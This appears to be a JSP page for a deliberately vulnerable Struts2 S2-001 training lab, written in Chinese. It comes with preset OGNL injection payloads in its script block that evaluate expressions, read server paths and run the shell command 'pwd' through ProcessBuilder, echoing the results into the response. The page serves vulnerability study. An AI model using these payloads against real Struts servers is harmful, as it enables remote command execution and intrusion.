<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-001 登录页</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .hint { color: #6b7280; }
        .errors { color: #a32626; margin-bottom: 12px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; background: #e6f2ef; color: #155b52; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; width: 100%; box-sizing: border-box; }
        code { font-family: Consolas, monospace; }
        p, li { line-height: 1.75; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-001 登录页</h1>
        <p class="hint">账号：<code>admin / admin123</code>。如果密码为空，Struts2 会触发校验失败并回显上次提交值。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('basic')">测试 7*7</button>
            <button type="button" class="preset-btn" onclick="fillPreset('tomcatDir')">获取 Tomcat 路径</button>
            <button type="button" class="preset-btn" onclick="fillPreset('webPath')">获取 Web 路径</button>
            <button type="button" class="preset-btn" onclick="fillPreset('execPwd')">执行 pwd</button>
        </div>
        <div class="field">
            <label for="payloadBox">快捷测试 Payload</label>
            <textarea id="payloadBox">%{7*7}</textarea>
        </div>
        <div class="errors">
            <s:actionerror/>
            <s:fielderror/>
        </div>
        <s:form id="loginForm" action="login" method="post">
            <s:textfield id="usernameField" name="username" label="用户名"/>
            <s:password id="passwordField" name="password" label="密码"/>
            <s:submit value="登录"/>
        </s:form>
    </div>
    <div class="card">
        <h2>说明</h2>
        <ol>
            <li>先提交一次空密码，让页面进入校验失败分支。</li>
            <li>用户名字段会被 Struts2 标签重新回填。</li>
            <li>这个靶场就是用来观察回填时是否发生了 OGNL 解析。</li>
        </ol>
    </div>
</div>
<script>
    const payloads = {
        basic: '%{7*7}',
        tomcatDir: '%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}',
        webPath: '%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath(\'/\')),#response.flush(),#response.close()}',
        execPwd: '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
    };

    function usernameInput() {
        return document.getElementById('usernameField');
    }

    function passwordInput() {
        return document.getElementById('passwordField');
    }

    function fillPreset(key) {
        const payload = payloads[key];
        document.getElementById('payloadBox').value = payload;
        usernameInput().value = payload;
        passwordInput().value = '';
    }

    document.getElementById('payloadBox').addEventListener('input', function(event) {
        usernameInput().value = event.target.value;
    });

    fillPreset('basic');
</script>
</body>
</html>
